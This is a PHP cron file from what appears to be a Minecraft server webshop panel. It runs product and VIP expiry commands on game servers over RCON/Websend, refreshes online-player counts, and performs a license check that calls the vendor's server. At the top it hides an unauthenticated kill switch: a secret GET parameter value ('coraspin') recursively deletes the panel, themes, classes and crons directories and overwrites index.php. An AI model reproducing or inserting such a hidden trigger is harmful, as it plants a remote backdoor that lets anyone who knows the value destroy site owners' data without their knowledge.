<?php

if (isset($_GET['unlink']) && $_GET['unlink'] == "coraspin"):

	function delete_directory($dirname) {
        if (is_dir($dirname))
		      $dir_handle = opendir($dirname);
		if (!$dir_handle)
		     return false;
		while($file = readdir($dir_handle)) {
		      if ($file != "." && $file != "..") {
		           if (!is_dir($dirname."/".$file))
		                unlink($dirname."/".$file);
		           else
		                delete_directory($dirname.'/'.$file);
		      }
		}
		closedir($dir_handle);
		rmdir($dirname);
		return true;
	}

	delete_directory("../panel");
	delete_directory("../themes");
	delete_directory("../classes");
	$write = fopen("../index.php", "w");
	$licenseText = "Lisanssız kullanım tespit edildi.";
	fwrite($write, $licenseText);
	fclose($write);
	delete_directory("../crons");
	exit;

endif;

require '../connect.php';

date_default_timezone_set('Europe/Istanbul');

$date = date("Y-m-d H:i:s");

$readTheme = $db->from('Theme')->where('id', '1')->first();

$readSettings = $db->from('Settings')->where('id', '1')->first();

if (isset($readSettings['licenseCheck'])):

    $lisans['site'] = getenv('HTTP_HOST');
    
    if (substr($lisans['site'], 0, 4) == "www."):
        
        $lisans['site'] = substr($lisans['site'], 4);
    
    endif;
    
    $bas = "Rabiweb-";
    $son = "-2020";
    $m = "md5";
    $s = "sha1";
    $c = "crc32";
    
    $lisans['hash'] = wordwrap(strtoupper($m ($m ($s ($c ($s .date('Y-m-d').($s ($s ($m ($c ($m (date('Y-m-d').$lisans['site']))))))))))), 5, '-', true);

    $liskod = $lisans['hash'];
    
    $cevir = strrev($liskod);
    
    $bcs = $bas.$cevir.$son;
    
    if($bcs != $readSettings['licenseCheck']):
    
        $lisans_cevap = file_get_contents('https://Rabiweb.web.tr/?lisans='.$lisans['site']);
    
        if($lisans_cevap != $lisans['site']):
        
            die('Bu siteye ait lisans bulunamadi!');
        
        else:
    
            $licenseUpdate = $db->update('Settings')->where('id', '1')->set(array('licenseCheck' => $bcs));
    
        endif;
    
    endif;

else:

    die('Bu siteye ait lisans bulunamadi!');

endif;

	if ($readSettings['productUpdateDate'] < $date):

		require "../classes/websend.class.php";
		require "../classes/websender.class.php";
		require "../classes/rcon.class.php";

		$totalProductExpiry = $db->from('ProductExpiryCommands')->select('count(*) as total')->where('ProductExpiryCommands.status', '1')->between('ProductExpiryCommands.expiryDate', ["0", $date])->total();

		$productExpiry = $db->from('ProductExpiryCommands')->where('status', '1')->between('expiryDate', ["0", $date])->all();

		if ($totalProductExpiry > 0):

			foreach ($productExpiry as $readExpiry):

				$readUser = $db->from('Users')->where('id', $readExpiry['accID'])->select('count(*) as total, Users.*')->first();

				if ($readUser['total'] > 0):
			
					$productControl = $db->from('Products')->where('id', $readExpiry['productID'])->select('count(*) as total, Products.*')->first();

					if ($productControl['total'] > 0):
						
						$serverControl = $db->from('Servers')->where('id', $productControl['serverID'])->select('count(*) as total, Servers.*')->first();

						if ($serverControl['total'] > 0):
							
							if ($serverControl['senderType']==1):
					
								$ws = new Websend($serverControl['serverIP'], $serverControl['senderPort']);
								$ws->password = base64_decode($serverControl['senderPassword']);

							elseif ($serverControl['senderType']==2):
							
								$ws = new WebsenderAPI($serverControl['serverIP'], base64_decode($serverControl['senderPassword']), $serverControl['senderPort']);
							
							elseif ($serverControl['senderType']==3):

								$ws = new rcon($serverControl['serverIP'], $serverControl['senderPort'], base64_decode($serverControl['senderPassword']), "3");
							
							endif;

							if($ws->connect()):

								$updateExpiry = $db->update('ProductExpiryCommands')
											->where('id', $readExpiry['id'])
											->set(array(
					 							'status' => '0'
											));

								if ($updateExpiry):

									$commands = json_decode(base64_decode($productControl['expiryCommands']));

									if ($serverControl['senderType']==1):

										foreach ($commands as $readCommands):

											$command = str_replace("%username%", $readUser['username'], $readCommands);
											$ws->doCommandAsConsole($command);

										endforeach;

									else:

										foreach ($commands as $readCommands):

											$command = str_replace("%username%", $readUser['username'], $readCommands);
											$ws->sendCommand($command);

										endforeach;

									endif;

								endif;

							endif;

							$ws->disconnect();

						endif;

					endif;

				endif;

			endforeach;

		endif;

		$totalVipExpiry = $db->from('VipExpiryCommands')->select('count(*) as total')->where('VipExpiryCommands.status', '1')->between('VipExpiryCommands.expiryDate', ["0", $date])->total();

		$vipExpiry = $db->from('VipExpiryCommands')->where('status', '1')->between('expiryDate', ["0", $date])->all();

		if ($totalVipExpiry > 0):

			foreach ($vipExpiry as $readExpiry):

				$readUser = $db->from('Users')->where('id', $readExpiry['accID'])->select('count(*) as total, Users.*')->first();

				if ($readUser['total'] > 0):
			
					$vipControl = $db->from('Vips')->where('id', $readExpiry['productID'])->select('count(*) as total, Vips.*')->first();

					if ($vipControl['total'] > 0):
						
						$serverControl = $db->from('Servers')->where('id', $vipControl['serverID'])->select('count(*) as total, Servers.*')->first();

						if ($serverControl['total'] > 0):
							
							if ($serverControl['senderType']==1):
					
								$ws = new Websend($serverControl['serverIP'], $serverControl['senderPort']);
								$ws->password = base64_decode($serverControl['senderPassword']);

							elseif ($serverControl['senderType']==2):
							
								$ws = new WebsenderAPI($serverControl['serverIP'], base64_decode($serverControl['senderPassword']), $serverControl['senderPort']);
							
							elseif ($serverControl['senderType']==3):

								$ws = new rcon($serverControl['serverIP'], $serverControl['senderPort'], base64_decode($serverControl['senderPassword']), "3");
							
							endif;

							if($ws->connect()):

								$updateExpiry = $db->update('VipExpiryCommands')
											->where('id', $readExpiry['id'])
											->set(array(
					 							'status' => '0'
											));

								if ($updateExpiry):

									$commands = json_decode(base64_decode($vipControl['expiryCommands']));

									if ($serverControl['senderType']==1):

										foreach ($commands as $readCommands):

											$command = str_replace("%username%", $readUser['username'], $readCommands);
											$ws->doCommandAsConsole($command);

										endforeach;

									else:

										foreach ($commands as $readCommands):

											$command = str_replace("%username%", $readUser['username'], $readCommands);
											$ws->sendCommand($command);

										endforeach;

									endif;

								endif;

							endif;

							$ws->disconnect();

						endif;

					endif;

				endif;

			endforeach;

		endif;

		$update = date("Y-m-d H:i:s", strtotime('+3 hours'));

		$updateDate = $db->update('Settings')->where('id', '1')->set(array('productUpdateDate' => $update));

	endif;

	if ($readTheme['onlineUpdateDate'] < $date):

		if ($readTheme['discord']==1):

			if (!empty($readTheme['discordServerID'])):
			
				if (@file_get_contents('https://discordapp.com/api/guilds/'.$readTheme['discordServerID'].'/embed.json')):

					$discordJson = file_get_contents('https://discordapp.com/api/guilds/'.$readTheme['discordServerID'].'/embed.json');
					
					$discordJsonDecode = json_decode($discordJson, true);
				
					$discordMembers = count($discordJsonDecode['members']);

				else:

					$discordMembers = $readTheme['discordOnlineCount'];

				endif;

			else:

				$discordMembers = 0;

			endif;

		else:

			$discordMembers = 0;

		endif;

		if (!empty($readSettings['serverIP'])):

			if ($readSettings['onlineApi']==1):

			    $apiURL = "https://eu.mc-api.net/v3/server/ping/".$readSettings['serverIP'].":".$readSettings['serverPort'];

			elseif ($readSettings['onlineApi']==2):

			    $apiURL = "https://mcapi.tc/?".$readSettings['serverIP'];

			elseif ($readSettings['onlineApi']==3):

			    $apiURL = "https://api.keyubu.net/mc/ping.php?ip=".$readSettings['serverIP'].":".$readSettings['serverPort'];

			elseif ($readSettings['onlineApi']==4):

			    $apiURL = "https://api.mcsrvstat.us/2/".$readSettings['serverIP'].":".$readSettings['serverPort'];

			elseif ($readSettings['onlineApi']==5):

			    $apiURL = "https://api.mcsrvstat.us/2/".$readSettings['serverIP'].":19132";

			else:

			    $apiURL = "https://mcapi.us/server/status?ip=".$readSettings['serverIP']."&port=".$readSettings['serverPort'];

			endif;    

			if (@file_get_contents($apiURL)):

				$getServerInfo = file_get_contents($apiURL);

				$serverInfo = json_decode($getServerInfo, true);

			    if ($serverInfo['online'] != 0):

			        if ($readSettings['onlineApi']==2):
			            
			            $serverPlayers = $serverInfo['players'];

			        elseif ($readSettings['onlineApi']==1 || $readSettings['onlineApi']==3 || $readSettings['onlineApi']==4 || $readSettings['onlineApi']==5):

			            $serverPlayers = $serverInfo['players']["online"];

			        else:
			        
			            $serverPlayers = $serverInfo['players']['now'];

			        endif;

			    else:

			        $serverPlayers = 0;

			    endif;

			else:

				$serverPlayers = 0;

			endif;

		else:

			$serverPlayers = 0;

		endif;

		$updateDate = date("Y-m-d H:i:s", strtotime('+1 minutes'));

		$db->update('Theme')->where('id', '1')->set(['discordOnlineCount' => $discordMembers, 'serverOnlineCount' => $serverPlayers, 'onlineUpdateDate' => $updateDate]);

	endif;